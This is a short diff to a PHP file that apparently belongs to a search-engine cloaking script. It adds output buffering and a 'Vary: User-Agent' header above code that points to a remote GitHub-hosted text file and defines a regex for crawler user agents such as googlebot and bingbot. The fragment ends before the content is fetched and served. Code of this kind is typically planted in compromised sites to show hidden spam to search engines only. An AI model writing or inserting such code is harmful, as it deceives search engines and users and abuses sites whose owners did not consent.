@@ -1,3 +1,6 @@
+<?php
+ob_start();
+header('Vary: User-Agent');
 $bot_url = "https://raw.githubusercontent.com/donpablo2910337/LP/refs/heads/main/avaefape.txt";
 $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
